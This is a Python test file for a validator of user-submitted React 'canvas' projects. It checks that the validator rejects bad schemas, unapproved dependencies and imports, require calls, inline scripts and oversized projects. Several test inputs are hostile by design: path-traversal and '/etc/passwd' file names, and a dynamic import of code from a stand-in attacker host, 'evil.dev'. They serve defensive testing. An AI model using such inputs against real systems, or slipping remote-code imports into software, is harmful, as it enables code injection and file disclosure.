from django.test import SimpleTestCase

from parameterized import parameterized

from products.canvas.backend.contract import contract_limits
from products.canvas.backend.source import (
    CANVAS_COMPONENT_PATH,
    CANVAS_ENTRY_HTML,
    has_errors,
    synthetic_source_project,
    validate_source_project,
)

MAX_FILE_BYTES = contract_limits()["maxSourceFileBytes"]
MAX_SOURCE_FILES = contract_limits()["maxSourceFiles"]

CODE = 'import React from "react";\nexport default () => <div>hi</div>;\n'


def project(**overrides):
    base = {
        "schemaVersion": 1,
        "files": {CANVAS_ENTRY_HTML: '<div id="root"></div>', CANVAS_COMPONENT_PATH: CODE},
        "entryHtml": CANVAS_ENTRY_HTML,
        "dependencies": {"react": "19.0.0"},
        "canvasSdkVersion": "0.1.0",
    }
    if "files" in overrides:
        overrides["files"] = {CANVAS_ENTRY_HTML: '<div id="root"></div>', **overrides["files"]}
    base.update(overrides)
    return base


class TestCanvasSourceAdapter(SimpleTestCase):
    def test_synthetic_project_of_legacy_canvas_validates_and_round_trips(self):
        # The read → edit → publish loop must accept its own output: a project
        # synthesized from a legacy canvas has to pass validation and reduce back
        # to the identical code.
        synthetic = synthetic_source_project(CODE)
        self.assertEqual(synthetic["files"][CANVAS_COMPONENT_PATH], CODE)
        self.assertFalse(has_errors(validate_source_project(synthetic)))

    def test_synthetic_project_of_unpublished_canvas_has_empty_component(self):
        synthetic = synthetic_source_project(None)
        self.assertEqual(synthetic["files"][CANVAS_COMPONENT_PATH], "")
        self.assertFalse(has_errors(validate_source_project(synthetic)))

    def test_valid_minimal_project_has_no_diagnostics(self):
        self.assertEqual(validate_source_project(project()), [])

    @parameterized.expand(
        [
            ("wrong_schema_version", project(schemaVersion=2), "unsupported_schema_version"),
            ("wrong_entry_html", project(entryHtml="main.html"), "invalid_entry"),
            (
                "path_traversal",
                project(files={CANVAS_COMPONENT_PATH: CODE, "../escape.tsx": "x"}),
                "invalid_path",
            ),
            (
                "absolute_path",
                project(files={CANVAS_COMPONENT_PATH: CODE, "/etc/passwd": "x"}),
                "invalid_path",
            ),
            (
                "backslash_path",
                project(files={CANVAS_COMPONENT_PATH: CODE, "src\\win.tsx": "x"}),
                "invalid_path",
            ),
            ("unknown_dependency", project(dependencies={"left-pad": "1.0.0"}), "dependency_not_admitted"),
            (
                "dependency_version_drift",
                project(dependencies={"react": "18.0.0"}),
                "dependency_version_mismatch",
            ),
            (
                "non_whitelisted_import",
                project(files={CANVAS_COMPONENT_PATH: 'import _ from "lodash";\n' + CODE}),
                "import_not_allowed",
            ),
            (
                "dynamic_import",
                project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
                "forbidden_dynamic_import",
            ),
            (
                "require_call",
                project(files={CANVAS_COMPONENT_PATH: 'const fs = require("fs");'}),
                "forbidden_require",
            ),
            (
                "inline_script_tag",
                project(files={CANVAS_COMPONENT_PATH: 'const html = "<script src=x></script>";'}),
                "forbidden_inline_script",
            ),
            (
                "file_too_large",
                project(files={CANVAS_COMPONENT_PATH: "a" * (MAX_FILE_BYTES + 1)}),
                "file_too_large",
            ),
            (
                "too_many_files",
                project(
                    files={
                        CANVAS_COMPONENT_PATH: CODE,
                        **{f"src/f{i}.ts": "x" for i in range(MAX_SOURCE_FILES)},
                    }
                ),
                "too_many_files",
            ),
            (
                "too_many_assets",
                project(
                    assets={
                        f"assets/{i}.png": {
                            "encoding": "base64",
                            "contentType": "image/png",
                            "content": "",
                        }
                        for i in range(MAX_SOURCE_FILES)
                    }
                ),
                "too_many_files",
            ),
        ]
    )
    def test_invalid_projects_produce_error_diagnostics(self, _name, candidate, expected_code):
        diagnostics = validate_source_project(candidate)
        self.assertTrue(has_errors(diagnostics), diagnostics)
        self.assertIn(expected_code, [d["code"] for d in diagnostics])

    def test_direct_network_calls_warn_but_stay_publishable(self):
        # fetch() is blocked by the sandbox CSP, not by publish — a comment or
        # string mentioning it must not brick a canvas, so it's a warning.
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE + 'fetch("/api/x");'})
        diagnostics = validate_source_project(candidate)
        self.assertFalse(has_errors(diagnostics))
        self.assertIn("network_fetch", [d["code"] for d in diagnostics])

    def test_import_diagnostics_carry_file_and_line(self):
        candidate = project(files={CANVAS_COMPONENT_PATH: CODE + 'import _ from "lodash";'})
        entry = next(d for d in validate_source_project(candidate) if d["code"] == "import_not_allowed")
        self.assertEqual(entry["path"], CANVAS_COMPONENT_PATH)
        self.assertEqual(entry["line"], 3)
